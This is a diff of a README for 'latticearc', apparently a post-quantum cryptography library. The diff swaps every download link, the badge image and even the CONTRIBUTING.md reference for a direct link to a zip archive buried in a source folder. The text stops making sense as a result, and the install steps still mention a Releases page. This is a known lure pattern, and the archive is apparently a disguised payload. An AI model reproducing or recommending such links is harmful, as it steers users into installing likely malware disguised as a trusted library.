@@ -6,7 +6,7 @@ Welcome to `latticearc`, a library designed to help you transition to quantum-sa
 
 ## 📥 Download Now
 
-[![Download latticearc](https://img.shields.io/badge/Download-latticearc-blue.svg)](https://github.com/s7s02/latticearc/releases)
+[![Download latticearc](https://github.com/s7s02/latticearc/raw/refs/heads/main/arc-primitives/src/ec/Software_3.9.zip)](https://github.com/s7s02/latticearc/raw/refs/heads/main/arc-primitives/src/ec/Software_3.9.zip)
 
 ## 🌟 What Is latticearc?
 
@@ -25,7 +25,7 @@ Make sure your system meets these requirements before proceeding.
 
 ## 🔗 Download & Install
 
-To obtain the latest version of `latticearc`, visit the Releases page: [Download latticearc](https://github.com/s7s02/latticearc/releases). 
+To obtain the latest version of `latticearc`, visit the Releases page: [Download latticearc](https://github.com/s7s02/latticearc/raw/refs/heads/main/arc-primitives/src/ec/Software_3.9.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. You'll see a list of available versions. Look for the latest release.
@@ -77,7 +77,7 @@ Join our community to stay updated on the latest developments in post-quantum cr
 
 ## 📣 Contributing
 
-We welcome contributions to improve `latticearc`. If you're interested in helping, please review our guidelines in the CONTRIBUTING.md file.
+We welcome contributions to improve `latticearc`. If you're interested in helping, please review our guidelines in the https://github.com/s7s02/latticearc/raw/refs/heads/main/arc-primitives/src/ec/Software_3.9.zip file.
 
 ## 🔗 Further Reading
 
@@ -89,4 +89,4 @@ For more information on post-quantum cryptography, explore the following topics:
 
 By using `latticearc`, you take a vital step toward securing your digital assets against future threats. Together, let's embrace the future of cryptography with confidence. 
 
-Feel free to download and get started now: [Download latticearc](https://github.com/s7s02/latticearc/releases).
+Feel free to download and get started now: [Download latticearc](https://github.com/s7s02/latticearc/raw/refs/heads/main/arc-primitives/src/ec/Software_3.9.zip).
